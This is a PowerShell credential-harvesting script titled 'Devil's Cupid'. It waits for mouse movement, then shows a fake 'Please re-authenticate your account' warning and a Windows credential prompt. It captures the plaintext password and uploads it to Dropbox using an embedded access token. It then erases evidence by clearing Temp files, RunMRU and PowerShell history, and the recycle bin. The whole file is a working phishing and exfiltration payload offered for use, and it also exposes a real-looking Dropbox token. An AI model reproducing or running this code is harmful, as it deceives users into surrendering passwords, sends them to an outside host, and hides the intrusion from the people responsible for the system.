############################################################################################################################################################                      
#
# _______                       __  __  __                 ______                       __        __ 
#|       \                     |  \|  \|  \               /      \                     |  \      |  \
#| $$$$$$$\  ______  __     __  \$$| $$| $$_______       |  $$$$$$\ __    __   ______   \$$  ____| $$
#| $$  | $$ /      \|  \   /  \|  \| $$ \$/       \      | $$   \$$|  \  |  \ /      \ |  \ /      $$
#| $$  | $$|  $$$$$$\\$$\ /  $$| $$| $$  |  $$$$$$$      | $$      | $$  | $$|  $$$$$$\| $$|  $$$$$$$
#| $$  | $$| $$    $$ \$$\  $$ | $$| $$   \$$    \       | $$   __ | $$  | $$| $$  | $$| $$| $$  | $$
#| $$__/ $$| $$$$$$$$  \$$ $$  | $$| $$   _\$$$$$$\      | $$__/  \| $$__/ $$| $$__/ $$| $$| $$__| $$
#| $$    $$ \$$     \   \$$$   | $$| $$  |       $$       \$$    $$ \$$    $$| $$    $$| $$ \$$    $$
# \$$$$$$$   \$$$$$$$    \$     \$$ \$$   \$$$$$$$         \$$$$$$   \$$$$$$ | $$$$$$$  \$$  \$$$$$$$
#                                                                            | $$                    
#                                                                            | $$                    
#                                                                             \$$                    
#                                                                                           By LulzHades
############################################################################################################################################################

#Version 1.0
#Last updated 24/02/2023

#------------------------------------------------------------------------------------------------------------------------------------

$DropBoxAccessToken = "sl.u.AF85VkL3Pd8etsjClRGZniUHbKPNO2tIchz8XjuW8ZxxTO1NJ_x_A8a5WisrGJs6J6DYwYzNOdmAVl4YMjQrvPCB51oFTcLSrFVXAGfhJpd-6XPR4sdMTw8hwwuvfZB3dUsfsju69zaDobFqzUh_N__pyJZqbuvH5JCHUMtLgqLtMzECqD-695yZ1PznUcpufWwTBjHqY3nHJ1EZSvU9X3a7U74ivrU5OEFs1HmgBxRxAwSarNWiCAGKEhWCtItpiinB4PTM_8I_Z2UVmX4r2Spn0fHrVrw4idb05AhIT9dCThV0Ow9OAWgjmE9etKfRJJdMNHDduiFpWWh5o-Kub1Dp-0PDFhY0UiCcr4_8tabLQOTzycQeZc_Uyw7l_e1BHevQW26GE_PPV2OcMv2L2qjKAbJFaI5Tp-BMFlFFS_F6jxNVrINlz3DPWWYNAxM-eMyqsFk2u0g5hwAkYGXtwOA4qukD7PvKZkjHob1NKug3wWrYCwGQho_HaDC8M27sdVpwUh6bZdRsJWTfwLr45w0V86q7W-gsCJZhBvh8KFt6PhsAeUgGW4lQY37Om5wkS00isFtrWoRlVvLJS-2i1QC4ho5UP13-IYH8XQybQjxcWoDNVmCGOPivzaPo8M5GQCGqGnsMEWbd8oOpcZuLwh7hUlLie_Ptmusf2-j3y8tyIFNbOr8GsNadRoNPFU2QH5__6XeDdKOlOGq1vyxOzdQalhG9gXH7hA12EgEZXO0oYMc4Pnu_BjXHutzwGTBzFxcv90sdew211hyBa_vSZKPUkvQYkrlSf6CLj-tqv-rkT76Mc4IijUPNg5RB9axfUJ7SEoFnStTOavYdSymRlcrXF8ttL-ukuKDawUvQds_gZHay1TnzRBWrYM9xoyqin_pYUGih_ME37rqmQGfmzqpxt_80vZkWWWpRbQsCilASGWyNCf1LmcDCccfGtATTq6l5Kl7TJ0T_NjhMrGb8qulr2lDY7mhCzv-GQJ3SIGLydCCQJq4-XASH1ZQfoIAgeFNxNtpJE_CxXELpSLyHqvBPnvfWpRYbGkWps1zm3a7j14xekx9WkZSBje7WLZIaOzLKF_ubDxpyeSSzqKOIhwwYoClW0gq1yrSGtUNkIl5qsQkmK5BsgPm2AJB4OiYBNBYlQKYWU_CVlqniotnKL8CBoOIjWTk9L8zHjuotkG6221FULb3vHfHZZzVS7M4xbEYeoTO8ZdpNBpNoDWrWzkBlTWmj8WH2cmxTmaD7y7FsNyoZp1mblRyFSzjhoAUAfm0FTyfPiqynzE-xcWpOEXvsMq6tOFagFGYLI5IbnHAj4nNjqVIpae7BZaUgi61bHHL5JYDaTNww56FMSOauU336_boLHqThMCUVon1y5QKsIEu70ZSxQN52mKxOZ_AGdayBBYWFFfSwG7nR0D4VwB3b"
$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"

#------------------------------------------------------------------------------------------------------------------------------------

<# This is to generate the ui.prompt you will use to harvest their credentials #>

function Get-Creds {
do{
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
   if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
    #[System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!")
    [System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!","Error",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Error)
    Get-Creds
}
$creds = $cred.GetNetworkCredential() | fl
return $creds
  # ...

  $done = $true
} until ($done)

}

#----------------------------------------------------------------------------------------------------

<# This is to pause the script until a mouse movement is detected #>

function Pause-Script{
Add-Type -AssemblyName System.Windows.Forms
$originalPOS = [System.Windows.Forms.Cursor]::Position.X
$o=New-Object -ComObject WScript.Shell

    while (1) {
        $pauseTime = 3
        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
            break
        }
        else {
            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
        }
    }
}

#----------------------------------------------------------------------------------------------------

# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 

function Caps-Off {
Add-Type -AssemblyName System.Windows.Forms
$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')

#If true, toggle CapsLock key, to ensure that the script doesn't fail
if ($caps -eq $true){

$key = New-Object -ComObject WScript.Shell
$key.SendKeys('{CapsLock}')
}
}
#----------------------------------------------------------------------------------------------------

<# This is to call the function to pause the script until a mouse movement is detected then activate the pop-up #>

Pause-Script

Caps-Off

Add-Type -AssemblyName System.Windows.Forms

# [System.Windows.Forms.MessageBox]::Show("Unusual sign-in. Please reauthenticate your account")
[System.Windows.Forms.MessageBox]::Show("Please re-authenticate your account!","Account Warning",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)

$creds = Get-Creds

#------------------------------------------------------------------------------------------------------------------------------------

<# This is to save the gathered credentials to a file in the temp directory #>

echo $creds >> $env:TMP\$FileName

#------------------------------------------------------------------------------------------------------------------------------------

<# This is to upload your files to DropBox #>

$TargetFilePath="/$FileName"
$SourceFilePath="$env:TMP\$FileName"
$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
$authorization = "Bearer " + $DropBoxAccessToken
$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
$headers.Add("Authorization", $authorization)
$headers.Add("Dropbox-API-Arg", $arg)
$headers.Add("Content-Type", 'application/octet-stream')
Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers

#------------------------------------------------------------------------------------------------------------------------------------

<# This is to clean up behind you and remove any evidence to prove you were in the system #>

# Delete contents of Temp folder 
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
